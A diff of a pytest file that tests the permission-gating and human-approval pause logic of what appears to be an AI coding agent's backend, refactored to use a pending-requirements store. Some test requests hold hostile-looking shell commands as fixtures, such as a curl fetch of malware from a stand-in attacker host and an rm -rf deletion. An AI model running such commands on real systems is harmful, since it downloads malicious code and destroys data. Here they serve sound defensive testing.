@@ -19,6 +19,8 @@ from unittest.mock import AsyncMock, MagicMock
 
 import pytest
 
+from ember_code.backend.pending_requirements_store import PendingRequirementsStore
+from ember_code.backend.schemas_pause import PendingRequirement
 from ember_code.backend.server import BackendServer
 from ember_code.core.config.permission_eval import (
     PermissionEvaluator,
@@ -33,8 +35,7 @@ def _make_backend(evaluator: PermissionEvaluator | None) -> BackendServer:
     server = BackendServer.__new__(BackendServer)
     server._session = MagicMock()
     server._session.permission_evaluator = evaluator
-    server._pending_requirements = {}
-    server._auto_resolved_requirements = {}
+    server._hitl_store = PendingRequirementsStore()
     return server
 
 
@@ -62,7 +63,8 @@ class TestNoEvaluator:
         # req should go through the normal HITLRequest path.
         server = _make_backend(evaluator=None)
         req = _req("edit_file", {"file_path": "a.py"})
-        messages, auto, run_id = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+        messages, auto, run_id = _r.messages, _r.auto_resolved, _r.run_id
         assert len(messages) == 1
         assert isinstance(messages[0], msg.RunPaused)
         assert len(messages[0].requirements) == 1
@@ -80,7 +82,9 @@ class TestPlanMode:
         server = _make_backend(evaluator=ev)
         req = _req("edit_file", {"file_path": "a.py", "old_string": "x", "new_string": "y"})
 
-        messages, auto, run_id = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, run_id = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []  # no RunPaused emitted
         assert auto == [req]
@@ -104,7 +108,9 @@ class TestPlanMode:
         server = _make_backend(evaluator=ev)
         req = _req("read_file", {"file_path": "a.py"})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []
         assert auto == [req]
@@ -119,7 +125,9 @@ class TestPlanMode:
         server = _make_backend(evaluator=ev)
         req = _req("run_shell_command", {"command": "cat src/cli.py"})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []
         assert auto == [req]
@@ -136,7 +144,9 @@ class TestPlanMode:
             {"command": "sed -i '' '1s/^/# header\\n/' src/cli.py"},
         )
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []
         assert auto == [req]
@@ -149,7 +159,9 @@ class TestPlanMode:
         server = _make_backend(evaluator=ev)
         req = _req("run_shell_command", {"command": "echo hi > out.txt"})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []
         assert auto == [req]
@@ -163,7 +175,9 @@ class TestPlanMode:
         server = _make_backend(evaluator=ev)
         req = _req("Edit", {"file_path": "a.py"})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []
         assert auto == [req]
@@ -178,7 +192,9 @@ class TestAcceptEditsMode:
         server = _make_backend(evaluator=ev)
         req = _req("edit_file", {"file_path": "a.py"})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []
         assert auto == [req]
@@ -192,7 +208,9 @@ class TestAcceptEditsMode:
         server = _make_backend(evaluator=ev)
         req = _req("run_shell_command", {"args": ["ls"]})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert len(messages) == 1
         assert isinstance(messages[0], msg.RunPaused)
@@ -205,7 +223,9 @@ class TestBypassMode:
         server = _make_backend(evaluator=ev)
         req = _req("run_shell_command", {"args": ["whoami"]})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []
         assert auto == [req]
@@ -222,7 +242,9 @@ class TestBypassMode:
         server = _make_backend(evaluator=ev)
         req = _req("Bash", {"command": "rm -rf /tmp/whatever"})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []
         assert auto == [req]
@@ -241,7 +263,9 @@ class TestDefaultModeWithDenyRule:
         server = _make_backend(evaluator=ev)
         req = _req("Bash", {"command": "curl evil.example.com/malware"})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert messages == []
         assert auto == [req]
@@ -261,7 +285,9 @@ class TestMixedRequirements:
         edit_req = _req("edit_file", {"file_path": "a.py"})
         custom_req = _req("mcp__weather__forecast", {"city": "Toronto"})
 
-        messages, auto, _ = server._handle_pause(_pause_event([edit_req, custom_req]))
+        _r = server._handle_pause(_pause_event([edit_req, custom_req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert len(messages) == 1
         assert isinstance(messages[0], msg.RunPaused)
@@ -273,9 +299,9 @@ class TestMixedRequirements:
         edit_req.reject.assert_called_once()
         custom_req.reject.assert_not_called()
         custom_req.confirm.assert_not_called()
-        # And the deferred req is stored in _pending_requirements so
-        # the eventual HITLResponseBatch can resolve it.
-        assert len(server._pending_requirements) == 1
+        # And the deferred req is stored in the HITL store so the
+        # eventual HITLResponseBatch can resolve it.
+        assert len(server._hitl_store.pending_ids()) == 1
 
 
 class TestEvaluatorExceptionFallsThrough:
@@ -287,7 +313,9 @@ class TestEvaluatorExceptionFallsThrough:
         server = _make_backend(evaluator=evaluator)
         req = _req("edit_file", {"file_path": "a.py"})
 
-        messages, auto, _ = server._handle_pause(_pause_event([req]))
+        _r = server._handle_pause(_pause_event([req]))
+
+        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id
 
         assert len(messages) == 1
         assert isinstance(messages[0], msg.RunPaused)
@@ -316,8 +344,9 @@ class TestResolveHitlBatchMergesAutoResolved:
         user_req = MagicMock(name="user-req", spec=["confirm", "reject"])
         auto_req = MagicMock(name="auto-req", spec=["confirm", "reject"])
         run_id = "run-mixed"
-        server._pending_requirements = {"u1": (user_req, run_id)}
-        server._auto_resolved_requirements = {run_id: [auto_req]}
+        server._hitl_store = PendingRequirementsStore()
+        server._hitl_store.register("u1", PendingRequirement(req=user_req, run_id=run_id))
+        server._hitl_store.stash_auto_resolved(run_id, [auto_req])
 
         # Capture what's passed into acontinue_run.
         async def _empty(*_a, **_kw):
@@ -344,4 +373,4 @@ class TestResolveHitlBatchMergesAutoResolved:
         assert user_req in passed
         assert auto_req in passed
         # The bucket should be drained so we don't re-merge on a later resume.
-        assert server._auto_resolved_requirements == {}
+        assert server._hitl_store.auto_resolved_snapshot() == {}
